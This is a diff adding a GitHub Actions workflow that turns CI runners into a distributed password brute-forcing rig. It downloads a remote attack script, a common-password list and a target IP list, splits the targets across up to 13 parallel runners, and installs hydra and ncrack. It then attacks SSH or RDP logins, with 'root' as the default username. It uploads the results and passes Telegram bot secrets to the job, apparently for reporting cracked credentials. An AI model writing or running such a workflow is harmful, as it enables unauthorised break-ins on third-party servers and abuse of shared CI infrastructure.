@@ -1,0 +1,182 @@
+name: practice-one
+
+on:
+  workflow_dispatch:
+    inputs:
+      python_script_url:
+        description: 'URL to Python script'
+        required: true
+        default: 'https://raw.githubusercontent.com/yourusername/yourrepo/main/bruteforcer.py'
+        type: string
+      password_list_url:
+        description: 'URL to password list'
+        required: true
+        default: 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt'
+        type: string
+      ip_list_url:
+        description: 'URL to IP list'
+        required: true
+        default: 'https://raw.githubusercontent.com/yourusername/yourrepo/main/ips.txt'
+        type: string
+      total_runners:
+        description: 'Number of parallel runners (1-13)'
+        required: true
+        default: '5'
+        type: choice
+        options:
+        - '1'
+        - '2'
+        - '3'
+        - '4'
+        - '5'
+        - '6'
+        - '7'
+        - '8'
+        - '9'
+        - '10'
+        - '11'
+        - '12'
+        - '13'
+      service_type:
+        description: 'Service to attack'
+        required: true
+        default: 'ssh'
+        type: choice
+        options: ['ssh', 'rdp']
+      username:
+        description: 'Username to test'
+        required: true
+        default: 'root'
+        type: string
+
+jobs:
+  setup:
+    name: Setup Environment
+    runs-on: ubuntu-latest
+    outputs:
+      chunk_files: ${{ steps.prepare.outputs.chunk_files }}
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Download files
+      run: |
+        mkdir -p files
+        echo "Downloading Python script..."
+        curl -s -o files/bruteforcer.py "${{ github.event.inputs.python_script_url }}"
+        
+        echo "Downloading password list..."
+        curl -s -o files/passwords.txt "${{ github.event.inputs.password_list_url }}"
+        
+        echo "Downloading IP list..."
+        curl -s -o files/ips.txt "${{ github.event.inputs.ip_list_url }}"
+        
+        echo "Files downloaded:"
+        ls -la files/
+
+    - name: Split IP list into chunks
+      id: prepare
+      run: |
+        cd files
+        total_ips=$(wc -l < ips.txt)
+        runners=${{ github.event.inputs.total_runners }}
+        chunk_size=$(( (total_ips + runners - 1) / runners ))
+        
+        echo "Splitting $total_ips IPs into $runners chunks (~$chunk_size each)"
+        
+        # Split the IP file
+        split -l $chunk_size ips.txt ip_chunk_
+        
+        # Create list of chunk files
+        chunk_files=$(ls ip_chunk_* | tr '\n' ' ')
+        echo "chunk_files=$chunk_files" >> $GITHUB_OUTPUT
+        
+        echo "Created chunks: $chunk_files"
+
+    - name: Upload prepared files
+      uses: actions/upload-artifact@v4
+      with:
+        name: prepared-files
+        path: files/
+        retention-days: 1
+
+  parallel-attack:
+    name: Runner ${{ matrix.runner_id }}
+    runs-on: ubuntu-latest
+    needs: setup
+    strategy:
+      matrix:
+        runner_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
+    if: matrix.runner_id <= ${{ github.event.inputs.total_runners }}
+    
+    steps:
+    - name: Download prepared files
+      uses: actions/download-artifact@v4
+      with:
+        name: prepared-files
+        path: files/
+
+    - name: Find my chunk file
+      run: |
+        cd files
+        chunk_files=($(ls ip_chunk_*))
+        runner_index=$(( ${{ matrix.runner_id }} - 1 ))
+        
+        if [ $runner_index -lt ${#chunk_files[@]} ]; then
+          my_chunk="${chunk_files[$runner_index]}"
+          echo "Runner ${{ matrix.runner_id }} using chunk: $my_chunk"
+          echo "CHUNK_FILE=$my_chunk" >> $GITHUB_ENV
+        else
+          echo "No chunk for runner ${{ matrix.runner_id }}, skipping..."
+          echo "SKIP_RUNNER=true" >> $GITHUB_ENV
+        fi
+
+    - name: Setup Python
+      if: env.SKIP_RUNNER != 'true'
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.10'
+
+    - name: Install dependencies
+      if: env.SKIP_RUNNER != 'true'
+      run: |
+        pip install requests
+        sudo apt update -y
+        sudo apt install hydra ncrack -y
+        echo "====[TAMAM]===="
+
+    - name: Run burt furs
+      if: env.SKIP_RUNNER != 'true'
+      env:
+        TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+        TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
+      run: |
+        cd files
+        echo "Runner ${{ matrix.runner_id }} starting play with chunk: $CHUNK_FILE"
+        echo "Target count: $(wc -l < $CHUNK_FILE)"
+        
+        python3 bruteforcer.py \
+          ${{ github.event.inputs.service_type }} \
+          $CHUNK_FILE \
+          "${{ github.event.inputs.username }}" \
+          passwords.txt
+
+    - name: Upload results
+      if: env.SKIP_RUNNER != 'true'
+      uses: actions/upload-artifact@v4
+      with:
+        name: runner-${{ matrix.runner_id }}-results
+        path: files/bruteforce_results_*.json
+        if-no-files-found: ignore
+
+  cleanup:
+    name: Cleanup
+    runs-on: ubuntu-latest
+    needs: [setup, parallel-attack]
+    if: always()
+    
+    steps:
+    - name: Delete artifacts
+      run: |
+        echo "Cleanup completed at $(date)"
+        echo "Workflow finished!"
